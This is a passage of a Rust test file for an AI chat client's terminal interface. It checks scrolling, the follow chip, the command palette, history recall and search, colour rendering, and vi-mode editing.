    /// comes back and the next turn clears it as on boot.
    #[test]
    fn undoing_the_only_exchange_brings_the_greeting_back() {
        let mut harness = Harness::standalone(80, 24);
        exchange(&mut harness);
        assert!(!harness.draw().contains("Tip: Press"));
        harness.app.begin_turn(".undo", true);
        harness.app.end_turn(true, &TurnOutcome::default());
        let frame = harness.draw();
        assert!(frame.contains("Tip: Press"), "{frame}");
        assert!(!frame.contains(".undo"), "{frame}");
        harness.app.begin_turn("second question", false);
        let frame = harness.draw();
        assert!(!frame.contains("Tip: Press"), "{frame}");
        assert!(matches!(
            harness.app.transcript.cells(),
            [Cell::User { text, .. }] if text == "second question"
        ));
    }

    /// A turn's worth of filler, enough to overflow the 80x24 view.
    fn fill_the_view(harness: &mut Harness) {
        harness.app.begin_turn("fill", false);
        for i in 0..20 {
            harness
                .app
                .transcript
                .push(Cell::user(&format!("filler line {i}")));
        }
        harness.app.end_turn(false, &TurnOutcome::default());
        harness.draw();
    }

    #[test]
    fn cells_arriving_below_a_scrolled_view_are_counted_on_a_chip() {
        let mut harness = Harness::standalone(80, 24);
        fill_the_view(&mut harness);
        assert!(harness.press(KeyCode::PageUp).is_none());
        assert!(harness.app.transcript.scrolled());
        let held = harness.draw();
        for i in 0..3 {
            harness
                .app
                .transcript
                .push(Cell::user(&format!("late line {i}")));
        }
        let frame = harness.draw();
        insta::assert_snapshot!("follow_chip_80x24", &frame);
        let chip = "3 new below  End = follow";
        let buffer = harness.terminal.backend().buffer();
        let row_text = |y: u16| -> String {
            (0..buffer.area.width)
                .map(|x| buffer[(x, y)].symbol())
                .collect()
        };
        let row = (0..buffer.area.height)
            .find(|y| row_text(*y).ends_with(chip))
            .unwrap_or_else(|| panic!("no right-aligned chip:\n{frame}"));
        let column = buffer.area.width - u16::try_from(chip.len()).unwrap();
        let modifier = |x: u16| buffer[(x, row)].modifier;
        assert!(modifier(column).contains(Modifier::REVERSED), "{frame}");
        assert!(
            !modifier(column - 1).contains(Modifier::REVERSED),
            "{frame}"
        );
        assert!(!frame.contains("late line 2"), "the view moved:\n{frame}");
        // The chip sits on the transcript's last row; everything above it
        // must be the held view, unchanged.
        let above_chip = usize::from(row);
        assert_eq!(
            frame.lines().take(above_chip).collect::<Vec<_>>(),
            held.lines().take(above_chip).collect::<Vec<_>>(),
            "the view slid under the new cells:\n{frame}"
        );

        assert!(harness.press(KeyCode::End).is_none());
        assert!(!harness.app.transcript.scrolled());
        let frame = harness.draw();
        assert!(!frame.contains("new below"), "{frame}");
        assert!(!frame.contains("End = follow"), "{frame}");
        assert!(frame.contains("late line 2"), "{frame}");
    }

    /// Scrolled up with nothing new yet, the chip already offers the way
    /// back, so a held view is never mistaken for a following one.
    #[test]
    fn a_scrolled_view_offers_the_way_back_before_anything_new_arrives() {
        let mut harness = Harness::standalone(80, 24);
        fill_the_view(&mut harness);
        harness.press(KeyCode::PageUp);
        let frame = harness.draw();
        insta::assert_snapshot!("follow_chip_idle_80x24", &frame);
        assert!(frame.contains("End = follow"), "{frame}");
        assert!(!frame.contains("new below"), "{frame}");
        harness.press(KeyCode::End);
        assert!(!harness.draw().contains("End = follow"));
    }

    /// Shift+G is the keyboard's other way back to the bottom, but only
    /// while the composer is empty: with a draft the letter is typing,
    /// and the view stays where it is.
    #[test]
    fn shift_g_follows_the_bottom_only_from_an_empty_composer() {
        let mut harness = Harness::standalone(80, 24);
        fill_the_view(&mut harness);
        let shift_g = KeyEvent::new(KeyCode::Char('G'), KeyModifiers::SHIFT);

        harness.press(KeyCode::PageUp);
        harness.type_text("draft");
        assert!(harness.app.handle_key(shift_g).is_none());
        assert!(harness.app.transcript.scrolled());
        assert_eq!(harness.app.composer.lines(), ["draftG"]);
        assert!(harness.draw().contains("End = follow"));

        harness.app.handle_key(ctrl(KeyCode::Char('c')));
        assert!(harness.app.composer.is_empty());
        assert!(harness.app.handle_key(shift_g).is_none());
        assert!(!harness.app.transcript.scrolled());
        assert!(harness.app.composer.is_empty());
        assert!(!harness.draw().contains("End = follow"));
    }

    /// Every custom widget draws only inside the buffer it is given, so
    /// a layout handing one an area the frame does not cover (a resize
    /// mid-draw, a zero-height pane) cannot panic or write out of range.
    #[test]
    fn every_custom_widget_clamps_its_area_to_the_buffer() {
        type Draw<'a> = Box<dyn FnMut(Rect, &mut Buffer) + 'a>;
        let mut welcome = Harness::standalone(80, 24);
        let mut plain = Harness::standalone(80, 24);
        exchange(&mut plain);
        let mut chip = Harness::standalone(80, 24);
        fill_the_view(&mut chip);
        chip.app.transcript.scroll_lines(-5);
        let mut todo = TodoPanel::default();
        todo.set("ship it".to_string(), todo_items());
        let (reply, _answers) = mpsc::channel();
        let confirm = PendingPrompt::new(confirm_request(Some("fs_write")), reply.clone());
        let input = PendingPrompt::new(
            PromptRequest::new(PromptAction::Input, "Name?", Origin::detached()),
            reply.clone(),
        );
        let select = PendingPrompt::new(
            list_request(PromptAction::Select, Some("ask")),
            reply.clone(),
        );
        let checkbox = PendingPrompt::new(list_request(PromptAction::Checkbox, None), reply);
        let dot = crate::config::CommandPrefix::Dot;
        let palette = PaletteState::build(".in", dot, PaletteSnapshot::EMPTY, &[], None)
            .expect("`.in` lists commands");
        let mut history = ComposerHistory::default();
        history.push("one");
        let search = SearchState::new(&history);
        let (rewind, _) = RewindState::from_cells(plain.app.transcript.cells(), dot);
        let rewind = rewind.expect("the exchange is a rewind row");
        let queued = vec![QueuedLine {
            text: "later".to_string(),
            command: false,
        }];
        let mut widgets: Vec<(&str, Draw<'_>)> = vec![
            (
                "transcript (welcome)",
                Box::new(|area, buf| {
                    welcome
                        .app
                        .transcript
                        .view(area, &mut welcome.app.renderer)
                        .render(area, buf);
                }),
            ),
            (
                "transcript",
                Box::new(|area, buf| {
                    plain
                        .app
                        .transcript
                        .view(area, &mut plain.app.renderer)
                        .render(area, buf);
                }),
            ),
            (
                "transcript (follow chip)",
                Box::new(|area, buf| {
                    let view = chip.app.transcript.view(area, &mut chip.app.renderer);
                    assert!(chip.app.transcript.scrolled());
                    view.render(area, buf);
                }),
            ),
            (
                "status strip",
                Box::new(|area, buf| {
                    StatusStrip(Some("thinking for 3s".to_string())).render(area, buf);
                }),
            ),
            (
                "footer bar",
                Box::new(|area, buf| {
                    FooterBar {
                        left: "openai:test-model . no session".to_string(),
                        right: Line::from("in 10 out 20"),
                    }
                    .render(area, buf);
                }),
            ),
            (
                "confirm modal",
                Box::new(|area, buf| PromptModal(&confirm).render(area, buf)),
            ),
            (
                "input modal",
                Box::new(|area, buf| PromptModal(&input).render(area, buf)),
            ),
            (
                "select modal",
                Box::new(|area, buf| PromptModal(&select).render(area, buf)),
            ),
            (
                "checkbox modal",
                Box::new(|area, buf| PromptModal(&checkbox).render(area, buf)),
            ),
            (
                "todo panel",
                Box::new(|area, buf| (&todo).render(area, buf)),
            ),
            (
                "palette band",
                Box::new(|area, buf| PaletteView(&palette).render(area, buf)),
            ),
            (
                "search band",
                Box::new(|area, buf| SearchView(&search).render(area, buf)),
            ),
            (
                "rewind band",
                Box::new(|area, buf| RewindView(&rewind).render(area, buf)),
            ),
            (
                "queued preview",
                Box::new(|area, buf| QueuedPreview(&queued).render(area, buf)),
            ),
        ];
        let screen = Rect::new(0, 0, 10, 3);
        for (name, render) in &mut widgets {
            let mut buf = Buffer::empty(screen);
            render(Rect::new(0, 0, 40, 10), &mut buf);
            assert_ne!(buf, Buffer::empty(screen), "{name}: nothing drawn");

            let mut buf = Buffer::empty(screen);
            render(Rect::new(20, 20, 5, 5), &mut buf);
            assert_eq!(
                buf,
                Buffer::empty(screen),
                "{name}: drew outside the buffer"
            );
        }
    }

    /// A line sent while scrolled up would otherwise land out of sight.
    #[test]
    fn a_submitted_line_brings_the_view_back_to_the_bottom() {
        let mut harness = Harness::standalone(80, 24);
        fill_the_view(&mut harness);
        harness.press(KeyCode::PageUp);
        assert!(harness.app.transcript.scrolled());
        harness.app.begin_turn("late question", false);
        assert!(!harness.app.transcript.scrolled());
        let frame = harness.draw();
        assert!(frame.contains("> late question"), "{frame}");
        assert!(!frame.contains("End = follow"), "{frame}");
    }

    /// The wheel moves the view; a left click on a row that opens
    /// focuses and opens it, mapped through the rows of the last frame.
    #[test]
    fn the_mouse_scrolls_the_view_and_opens_the_row_it_clicks() {
        let mut harness = Harness::standalone(80, 24);
        running_fs_read(&mut harness);
        finish_tool(&mut harness, "call-1", true, None);
        harness.app.end_turn(false, &TurnOutcome::default());
        harness.draw();
        let mouse = |kind: MouseEventKind, column: u16, row: u16| {
            TermInput::Mouse(MouseEvent {
                kind,
                column,
                row,
                modifiers: KeyModifiers::NONE,
            })
        };
        let row = screen_row(&harness, "fs_read(");
        assert!(
            harness
                .app
                .handle_input(mouse(MouseEventKind::Down(MouseButton::Left), 4, row))
                .is_none()
        );
        assert!(harness.app.transcript.focused());
        assert!(matches!(
            &harness.app.transcript.cells()[1],
            Cell::Tool { expanded: true, .. }
        ));
        let frame = harness.draw();
        assert!(frame.contains("fn main()"), "{frame}");
        assert!(
            row_modifier(&harness, "fs_read(").contains(Modifier::REVERSED),
            "the clicked header is not reversed"
        );

        fill_the_view(&mut harness);
        assert!(
            harness
                .app
                .handle_input(mouse(MouseEventKind::ScrollUp, 0, 0))
                .is_none()
        );
        assert!(harness.app.transcript.scrolled());
        assert!(harness.draw().contains("End = follow"));
        harness
            .app
            .handle_input(mouse(MouseEventKind::ScrollDown, 0, 0));
        assert!(!harness.app.transcript.scrolled());
    }

    #[test]
    fn end_on_an_unscrolled_view_moves_the_composer_cursor() {
        let mut harness = Harness::standalone(80, 24);
        harness.type_text("ac");
        harness.press(KeyCode::Left);
        harness.type_text("b");
        assert!(harness.press(KeyCode::End).is_none());
        assert!(!harness.app.transcript.scrolled());
        harness.type_text("d");
        assert_eq!(harness.app.composer_text(), "abcd");
    }

    /// Where the composer lands at 80x24 with a one-line draft: the rule
    /// above its three text rows, with the footer under them.
    const COMPOSER_RULE_ROW: u16 = 19;
    const COMPOSER_TEXT_ROW: u16 = 20;

    fn composer_cell(harness: &Harness, x: u16) -> (Color, bool) {
        let cell = &harness.terminal.backend().buffer()[(x, COMPOSER_TEXT_ROW)];
        (cell.fg, cell.modifier.contains(Modifier::BOLD))
    }

    /// The symbols of the last drawn frame's row `y`, unquoted.
    fn row_text(harness: &Harness, y: u16) -> String {
        let buffer = harness.terminal.backend().buffer();
        (0..buffer.area().width)
            .map(|x| buffer[(x, y)].symbol())
            .collect()
    }

    #[test]
    fn a_typed_command_is_painted_green_on_the_field_under_the_rule() {
        let mut harness = Harness::standalone(80, 24);
        // The test process's stdout is a pipe, which `NO_COLOR` reads as a
        // colourless terminal.
        harness.app.set_no_color(false);
        harness.type_text(".info tools");
        let frame = harness.draw();
        assert_welcome_snapshot("composer_command_80x24", &frame);
        let buffer = harness.terminal.backend().buffer();
        assert_eq!(
            buffer[(0, COMPOSER_RULE_ROW)].symbol(),
            ratatui::symbols::line::HORIZONTAL
        );
        assert!(
            buffer[(0, COMPOSER_RULE_ROW)]
                .modifier
                .contains(Modifier::DIM)
        );
        assert!(
            (0..11).all(|x| composer_cell(&harness, x) == (Color::Green, true)),
            "{frame}"
        );
        assert_eq!(composer_cell(&harness, 11), (Color::Reset, false));
        assert_eq!(buffer[(0, COMPOSER_TEXT_ROW)].bg, Color::Indexed(236));
        assert_eq!(buffer[(79, COMPOSER_TEXT_ROW + 2)].bg, Color::Indexed(236));
    }

    #[test]
    fn no_color_keeps_the_command_bold_without_colour_or_surface() {
        let mut harness = Harness::standalone(80, 24);
        harness.app.set_no_color(true);
        harness.type_text(".info tools");
        let frame = harness.draw();
        assert_welcome_snapshot("composer_command_no_color_80x24", &frame);
        assert!(
            (0..11).all(|x| composer_cell(&harness, x) == (Color::Reset, true)),
            "{frame}"
        );
        let buffer = harness.terminal.backend().buffer();
        assert!((0..80).all(|x| buffer[(x, COMPOSER_TEXT_ROW)].bg == Color::Reset));
    }

    /// The textarea draws its cursor as a reversed cell; after the draft
    /// it has to sit on the field's text rows, not on the rule.
    #[test]
    fn the_cursor_sits_inside_the_field_under_the_rule() {
        let mut harness = Harness::standalone(80, 24);
        harness.type_text("draft");
        harness.render();
        let buffer = harness.terminal.backend().buffer();
        let cursor = buffer
            .area
            .positions()
            .find(|position| buffer[*position].modifier.contains(Modifier::REVERSED))
            .expect("the composer draws its cursor");
        assert_eq!((cursor.x, cursor.y), (5, COMPOSER_TEXT_ROW));
    }

    fn palette(harness: &Harness) -> Option<&PaletteState> {
        match &harness.app.view {
            View::Palette(palette) => Some(palette),
            _ => None,
        }
    }

    #[test]
    fn a_typed_sigil_opens_the_palette_with_no_highlight() {
        let mut harness = Harness::standalone(80, 24);
        harness.type_text(".");
        let palette = palette(&harness).expect("the palette opens on a sigil");
        assert_eq!(palette.highlight, None);
        assert!(palette.rows.iter().any(|row| row.value == ".help "));
        assert_eq!(palette.token_range, 0..1);
        harness.type_text("in");
        let frame = harness.draw();
        assert_welcome_snapshot("palette_open_80x24", &frame);
        assert!(frame.contains(".info"), "{frame}");
        assert!(frame.contains("Show system info"), "{frame}");
    }

    /// Seeded from the context, the first `.` lists what the context
    /// allows, the rows the REPL completer gives: the tool and skill
    /// commands a bare state hides, and not the `.agent` a bare state
    /// alone offers.
    #[test]
    fn the_palette_seeded_from_the_context_lists_what_the_context_allows() {
        let mut ctx = chat_ctx();
        assert!(ctx.app.config.function_calling_support);
        assert!(ctx.resolved_skills_enabled());
        let mut harness = Harness::for_ctx(&ctx);
        harness.app.sync_from_ctx(&mut ctx);
        harness.press_with_ctx(KeyCode::Char('.'), Some(&ctx));
        let rows: Vec<&str> = palette(&harness)
            .expect("the palette opens on a sigil")
            .rows
            .iter()
            .map(|row| row.value.trim_end())
            .collect();
        for present in [".info tools", ".skill load", ".tool enable"] {
            assert!(rows.contains(&present), "{present} missing from {rows:?}");
        }
        assert!(!rows.contains(&".agent"), "{rows:?}");
    }

    #[test]
    fn enter_with_no_highlight_submits_the_line() {
        let mut harness = Harness::standalone(80, 24);
        harness.type_text(".in");
        assert!(palette(&harness).is_some());
        assert_eq!(
            harness.press(KeyCode::Enter),
            Some(Command::Submit(".in".to_string()))
        );
        assert!(palette(&harness).is_none());
        assert!(harness.app.composer.is_empty());
    }

    /// Mid-turn the same Enter holds the line instead; a command waits
    /// without reaching the loop.
    #[test]
    fn enter_with_the_palette_open_and_no_highlight_queues_the_command_mid_turn() {
        let mut harness = Harness::standalone(80, 24);
        harness.app.begin_turn("explain", false);
        harness.type_text(".info");
        assert_eq!(
            palette(&harness).map(|palette| palette.highlight),
            Some(None)
        );
        assert_eq!(harness.press(KeyCode::Enter), None);
        assert_eq!(
            harness.app.queued,
            vec![QueuedLine {
                text: ".info".to_string(),
                command: true
            }]
        );
        assert!(palette(&harness).is_none());
        assert!(harness.app.composer.is_empty());
    }

    #[test]
    fn tab_highlights_the_first_row_and_enter_takes_it() {
        let mut harness = Harness::standalone(80, 24);
        harness.type_text(".inf");
        assert!(harness.press(KeyCode::Tab).is_none());
        let open = palette(&harness).expect("still open");
        assert_eq!(open.highlight, Some(0));
        let first = open.rows[0].value.clone();
        assert!(
            first.starts_with(".in") && first.ends_with(' '),
            "{first:?}"
        );
        assert!(harness.press(KeyCode::Enter).is_none());
        assert_eq!(harness.app.composer_text(), first);
        assert!(palette(&harness).is_none_or(|open| open.token_range.start > 0));
        harness.type_text("x");
        assert_eq!(harness.app.composer_text(), format!("{first}x"));
    }

    #[test]
    fn up_from_the_first_row_clears_the_highlight() {
        let mut harness = Harness::standalone(80, 24);
        harness.type_text(".");
        harness.press(KeyCode::Down);
        harness.press(KeyCode::Down);
        assert_eq!(palette(&harness).unwrap().highlight, Some(1));
        harness.press(KeyCode::BackTab);
        assert_eq!(palette(&harness).unwrap().highlight, Some(0));
        harness.press(KeyCode::Up);
        assert_eq!(palette(&harness).unwrap().highlight, None);
    }

    #[test]
    fn esc_closes_the_palette_without_interrupting_or_losing_the_draft() {
        let mut harness = Harness::standalone(80, 24);
        harness.app.begin_turn("hello", false);
        harness.type_text(".in");
        assert!(palette(&harness).is_some());
        assert_eq!(harness.press(KeyCode::Esc), None);
        assert!(palette(&harness).is_none());
        assert_eq!(harness.app.composer_text(), ".in");
        assert_eq!(harness.press(KeyCode::Esc), Some(Command::Interrupt));
        harness.type_text("f");
        assert!(palette(&harness).is_some(), "an edit reopens it");
    }

    #[test]
    fn tab_reopens_a_closed_palette_on_a_command_line() {
        let mut harness = Harness::standalone(80, 24);
        harness.type_text(".in");
        harness.press(KeyCode::Esc);
        assert!(palette(&harness).is_none());
        harness.press(KeyCode::Tab);
        assert!(palette(&harness).is_some());
        assert_eq!(harness.app.composer_text(), ".in");
    }

    /// A fence opened in front of the command still gets the palette,
    /// with the token to replace behind the fence.
    #[test]
    fn a_fenced_command_line_opens_the_palette_behind_the_fence() {
        let mut harness = Harness::standalone(80, 24);
        harness.type_text("::: .in");
        let palette = palette(&harness).expect("the fenced line opens the palette");
        assert!(palette.rows.iter().any(|row| row.value == ".info "));
        assert_eq!(palette.token_range, 4..7);
    }

    #[test]
    fn a_space_after_a_full_command_keeps_the_palette_only_for_arguments() {
        let ctx = chat_ctx();
        let mut harness = Harness::for_ctx(&ctx);
        for c in ".help".chars() {
            harness.press_with_ctx(KeyCode::Char(c), Some(&ctx));
        }
        assert!(palette(&harness).is_some());
        harness.press_with_ctx(KeyCode::Char(' '), Some(&ctx));
        assert!(palette(&harness).is_none());

        harness.app.set_composer_text(".set");
        harness.app.refresh_palette(Some(&ctx));
        harness.press_with_ctx(KeyCode::Char(' '), Some(&ctx));
        let palette = palette(&harness).expect("the settable keys are rows");
        assert!(palette.rows.iter().all(|row| !row.value.starts_with('.')));
        // Argument values keep the completer's trailing space, so the
        // accepted token ends ready for the next one.
        assert!(
            palette.rows.iter().any(|row| row.value == "highlight "),
            "{:?}",
            palette.rows
        );
        assert_eq!(palette.token_range, 5..5);
        harness.press_with_ctx(KeyCode::Tab, Some(&ctx));
        let first = palette_first_value(&harness);
        harness.press_with_ctx(KeyCode::Enter, Some(&ctx));
        assert_eq!(harness.app.composer_text(), format!(".set {first}"));
    }

    fn palette_first_value(harness: &Harness) -> String {
        palette(harness).unwrap().rows[0].value.clone()
    }

    #[test]
    fn mid_turn_the_palette_lists_commands_from_the_snapshot_only() {
        let mut harness = Harness::standalone(80, 24);
        harness.app.begin_turn("hello", false);
        harness.type_text(".set ");
        assert!(palette(&harness).is_none());
        harness.app.set_composer_text(".h");
        harness.app.refresh_palette(None);
        let palette = palette(&harness).expect("commands need no context");
        assert!(palette.rows.iter().any(|row| row.value == ".help "));
    }

    #[test]
    fn a_prompt_arriving_closes_the_palette() {
        let mut harness = Harness::standalone(80, 24);
        harness.app.begin_turn("hello", false);
        harness.type_text(".in");
        assert!(palette(&harness).is_some());
        let asker = ask_on_a_thread(&mut harness, confirm_request(None));
        assert!(palette(&harness).is_none());
        assert!(matches!(
            harness.app.key_context().modal,
            Some(ModalKind::Confirm { .. })
        ));
        harness.press(KeyCode::Esc);
        assert!(matches!(asker.join().unwrap(), Ok(PromptAnswer::Cancelled)));
    }

    #[test]
    fn a_second_line_closes_the_palette() {
        let mut harness = Harness::standalone(80, 24);
        harness.type_text(".in");
        assert!(palette(&harness).is_some());
        harness
            .app
            .handle_key(KeyEvent::new(KeyCode::Enter, KeyModifiers::SHIFT));
        harness.app.refresh_palette(None);
        assert!(palette(&harness).is_none());
    }

    /// The composer can change under an open band without a key (an
    /// editor's result, a rewind's prefill). Enter on the highlight then
    /// closes the band and leaves the draft as it is: the band's token
    /// range belongs to a line that is gone.
    #[test]
    fn enter_on_a_palette_left_behind_by_an_edit_closes_it_and_keeps_the_draft() {
        let mut harness = Harness::standalone(80, 24);
        harness.type_text(".in");
        harness.press(KeyCode::Tab);
        assert!(palette(&harness).is_some_and(|open| open.highlighted().is_some()));
        harness.app.set_composer_text(".i");
        let enter = KeyEvent::new(KeyCode::Enter, KeyModifiers::NONE);
        assert_eq!(harness.app.handle_key(enter), None);
        assert!(palette(&harness).is_none());
        assert_eq!(harness.app.composer_text(), ".i");

        harness.type_text("n");
        harness.press(KeyCode::Tab);
        assert!(palette(&harness).is_some_and(|open| open.highlighted().is_some()));
        harness.app.set_composer_text("x");
        assert_eq!(harness.app.handle_key(enter), None);
        assert!(palette(&harness).is_none());
        assert_eq!(harness.app.composer_text(), "x");
    }

    #[test]
    fn the_palette_band_sits_above_the_rule_and_keeps_the_transcript_minimum() {
        let mut harness = Harness::standalone(80, 24);
        harness.type_text(".");
        harness.render();
        let rows = harness.app.band_rows(Rect::new(0, 0, 80, 24));
        assert_eq!(rows, bottom_pane::BAND_MAX_ROWS);
        let frame = harness.terminal.backend().to_string();
        assert!(row_text(&harness, COMPOSER_RULE_ROW).contains(ratatui::symbols::line::HORIZONTAL));
        assert!(
            row_text(&harness, COMPOSER_RULE_ROW - 1).contains("(+"),
            "{frame}"
        );
        assert!(
            row_text(&harness, COMPOSER_RULE_ROW - rows).starts_with('.'),
            "{frame}"
        );
        assert_eq!(
            row_text(&harness, COMPOSER_RULE_ROW - rows - 1).trim(),
            "",
            "the status row sits between the transcript and the band\n{frame}"
        );

        harness.resize(80, 12);
        harness.render();
        let room = 12 - (harness.app.composer.rows() + 2 + TRANSCRIPT_MIN_ROWS);
        assert_eq!(harness.app.band_rows(Rect::new(0, 0, 80, 12)), room);
        let frame = harness.terminal.backend().to_string();
        let band_top = 12 - 1 - harness.app.composer.rows() - room;
        assert!(row_text(&harness, band_top).starts_with('.'), "{frame}");
        assert!(
            row_text(&harness, band_top + room - 1).contains("(+"),
            "the hidden count is the band's last row\n{frame}"
        );
        assert!(
            row_text(&harness, band_top + room).contains(ratatui::symbols::line::HORIZONTAL),
            "the rule follows the band\n{frame}"
        );
    }

    fn submit(harness: &mut Harness, line: &str) {
        harness.type_text(line);
        assert_eq!(
            harness.press(KeyCode::Enter),
            Some(Command::Submit(line.to_string()))
        );
    }

    #[test]
    fn up_and_down_on_a_single_line_walk_the_history_around_the_draft() {
        let mut harness = Harness::standalone(80, 24);
        assert!(harness.app.history_file.is_none(), "tests keep no file");
        submit(&mut harness, "first");
        submit(&mut harness, "second");
        harness.type_text("draft");
        assert!(harness.press(KeyCode::Up).is_none());
        assert_eq!(harness.app.composer_text(), "second");
        harness.press(KeyCode::Up);
        assert_eq!(harness.app.composer_text(), "first");
        harness.press(KeyCode::Up);
        assert_eq!(harness.app.composer_text(), "first", "the oldest holds");
        harness.press(KeyCode::Down);
        assert_eq!(harness.app.composer_text(), "second");
        harness.press(KeyCode::Down);
        assert_eq!(harness.app.composer_text(), "draft");
        harness.press(KeyCode::Down);
        assert_eq!(harness.app.composer_text(), "draft");
        assert_eq!(
            harness.press(KeyCode::Enter),
            Some(Command::Submit("draft".to_string()))
        );
        harness.press(KeyCode::Up);
        assert_eq!(harness.app.composer_text(), "draft");
        harness.press(KeyCode::Up);
        assert_eq!(harness.app.composer_text(), "second");
    }

    /// A recalled command line is not an edit: the palette stays shut so
    /// Up keeps walking instead of moving a highlight, and the first real
    /// edit brings the palette back.
    #[test]
    fn walking_the_history_does_not_reopen_the_palette() {
        let mut harness = Harness::standalone(80, 24);
        for line in [".info", "plain", ".help"] {
            harness.app.history.push(line);
        }
        harness.press(KeyCode::Up);
        assert_eq!(harness.app.composer_text(), ".help");
        assert!(palette(&harness).is_none());
        harness.press(KeyCode::Up);
        assert_eq!(harness.app.composer_text(), "plain");
        harness.press(KeyCode::Up);
        assert_eq!(harness.app.composer_text(), ".info");
        assert!(palette(&harness).is_none());
        harness.press(KeyCode::Backspace);
        assert_eq!(harness.app.composer_text(), ".inf");
        assert!(palette(&harness).is_some());
    }

    /// A command line recalled through the Ctrl+R search is a history
    /// walk too: no palette over it, and the next Up walks on.
    #[test]
    fn recalling_from_the_search_does_not_reopen_the_palette() {
        let mut harness = Harness::standalone(80, 24);
        for line in [".info", "plain", ".help"] {
            harness.app.history.push(line);
        }
        harness.app.handle_key(ctrl(KeyCode::Char('r')));
        harness.type_text(".he");
        assert_eq!(search(&harness).unwrap().matches, [".help"]);
        assert!(harness.press(KeyCode::Enter).is_none());
        assert_eq!(harness.app.composer_text(), ".help");
        assert!(palette(&harness).is_none());
        harness.press(KeyCode::Up);
        assert_eq!(harness.app.composer_text(), ".help");
        assert!(palette(&harness).is_none());
        harness.press(KeyCode::Up);
        assert_eq!(harness.app.composer_text(), "plain");
    }

    /// Clearing the composer mid-walk, or recalling an entry through the
    /// search mid-walk, ends the walk: the next Up starts from the newest
    /// entry rather than carrying on from where the walk was.
    #[test]
    fn clearing_or_searching_ends_the_history_walk() {
        let mut harness = Harness::standalone(80, 24);
        for line in [".info", "plain", ".help"] {
            harness.app.history.push(line);
        }
        harness.press(KeyCode::Up);
        harness.press(KeyCode::Up);
        assert_eq!(harness.app.composer_text(), "plain");
        harness.app.handle_key(ctrl(KeyCode::Char('c')));
        assert!(harness.app.composer.is_empty());
        harness.press(KeyCode::Up);
        assert_eq!(harness.app.composer_text(), ".help");

        harness.press(KeyCode::Up);
        assert_eq!(harness.app.composer_text(), "plain");
        harness.app.handle_key(ctrl(KeyCode::Char('r')));
        harness.type_text(".in");
        assert!(harness.press(KeyCode::Enter).is_none());
        assert_eq!(harness.app.composer_text(), ".info");
        harness.press(KeyCode::Up);
        assert_eq!(harness.app.composer_text(), ".help");
    }

    #[test]
    fn the_arrows_of_a_multi_line_draft_stay_with_the_cursor() {
        let mut harness = Harness::standalone(80, 24);
        submit(&mut harness, "old line");
        harness.type_text("one");
        harness
            .app
            .handle_key(KeyEvent::new(KeyCode::Enter, KeyModifiers::SHIFT));
        harness.type_text("two");
        harness.press(KeyCode::Up);
        assert_eq!(harness.app.composer_text(), "one\ntwo");
        harness.type_text("!");
        assert_eq!(harness.app.composer_text(), "one!\ntwo");
    }

    #[test]
    fn a_submitted_line_is_recorded_in_the_history_file_when_one_is_kept() {
        let dir = std::env::temp_dir().join(format!(
            "coyote-tui-history-{}",
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_nanos()
        ));
        let path = dir.join("history");
        let mut harness = Harness::standalone(80, 24);
        harness.app.history_file = Some(path.clone());
        submit(&mut harness, "hello");
        submit(&mut harness, ".info");
        assert_eq!(std::fs::read_to_string(&path).unwrap(), "hello\n.info\n");
        std::fs::remove_dir_all(dir).unwrap();

        let saving = AppConfig {
            save_shell_history: true,
            ..Default::default()
        };
        assert!(history_file(&saving, None).is_some_and(|p| p.ends_with("default")));
        assert!(history_file(&saving, Some("a/b")).is_some_and(|p| p.ends_with("session_a_b")));
        assert_eq!(history_file(&plain_config(), Some("a")), None);
    }

    fn search(harness: &Harness) -> Option<&SearchState> {
        match &harness.app.view {
            View::HistorySearch(search) => Some(search),
            _ => None,
        }
    }

    #[test]
    fn ctrl_r_opens_the_search_band_whose_filter_narrows_and_enter_recalls() {
        let mut harness = Harness::standalone(80, 24);
        submit(&mut harness, "git status");
        submit(&mut harness, "cargo test");
        submit(&mut harness, "git log");
        assert!(harness.app.handle_key(ctrl(KeyCode::Char('r'))).is_none());
        let open = search(&harness).expect("the band opens");
        assert_eq!(open.matches, ["git log", "cargo test", "git status"]);
        harness.type_text("git");
        let open = search(&harness).unwrap();
        assert_eq!(open.filter, "git");
        assert_eq!(open.matches, ["git log", "git status"]);
        assert_eq!(harness.app.composer_text(), "", "typing goes to the filter");
        let frame = harness.draw();
        assert!(frame.contains("history: git"), "{frame}");
        assert!(!frame.contains("cargo test"), "{frame}");
        harness.press(KeyCode::Down);
        assert!(harness.press(KeyCode::Enter).is_none());
        assert!(search(&harness).is_none());
        assert_eq!(harness.app.composer_text(), "git status");

        harness.app.handle_key(ctrl(KeyCode::Char('r')));
        harness.type_text("x");
        harness.press(KeyCode::Backspace);
        assert_eq!(search(&harness).unwrap().filter, "");
        assert_eq!(harness.press(KeyCode::Esc), None);
        assert!(search(&harness).is_none());
        assert_eq!(harness.app.composer_text(), "git status");
    }

    #[test]
    fn the_search_band_with_no_matches_closes_on_enter_leaving_the_draft() {
        let mut harness = Harness::standalone(80, 24);
        harness.type_text("draft");
        harness.app.handle_key(ctrl(KeyCode::Char('r')));
        assert!(search(&harness).unwrap().matches.is_empty());
        let frame = harness.draw();
        assert!(frame.contains("(no matches)"), "{frame}");
        assert!(harness.press(KeyCode::Enter).is_none());
        assert!(search(&harness).is_none());
        assert_eq!(harness.app.composer_text(), "draft");
    }

    fn vi_harness() -> Harness {
        let footer = FooterInfo {
            model: "openai:test-model".to_string(),
            ..FooterInfo::default()
        };
        let config = Arc::new(AppConfig {
            keybindings: "vi".to_string(),
            ..(*plain_config()).clone()
        });
        Harness::new(80, 24, config, footer)
    }

    #[test]
    fn emacs_bindings_have_no_vi_mode() {
        let mut harness = Harness::standalone(80, 24);
        assert_eq!(harness.app.vi_mode, None);
        harness.type_text("text");
        assert_eq!(harness.press(KeyCode::Esc), None);
        assert_eq!(harness.app.vi_mode, None);
        assert!(!harness.draw().contains(composer::NORMAL_TAG));
    }

    #[test]
    fn vi_esc_enters_normal_mode_where_the_letters_move_delete_and_return_to_insert() {
        let mut harness = vi_harness();
        assert_eq!(harness.app.vi_mode, Some(ViMode::Insert));
        harness.type_text("one two");
        assert_eq!(harness.press(KeyCode::Esc), None);
        assert_eq!(harness.app.vi_mode, Some(ViMode::Normal));
        assert!(harness.draw().contains(composer::NORMAL_TAG));
        harness.type_text("0x");
        assert_eq!(harness.app.composer_text(), "ne two");
        harness.type_text("$hx");
        assert_eq!(harness.app.composer_text(), "ne to");
        harness.type_text("0wx");
        assert_eq!(harness.app.composer_text(), "ne o");
        harness.type_text("$bx");
        assert_eq!(harness.app.composer_text(), "e o");
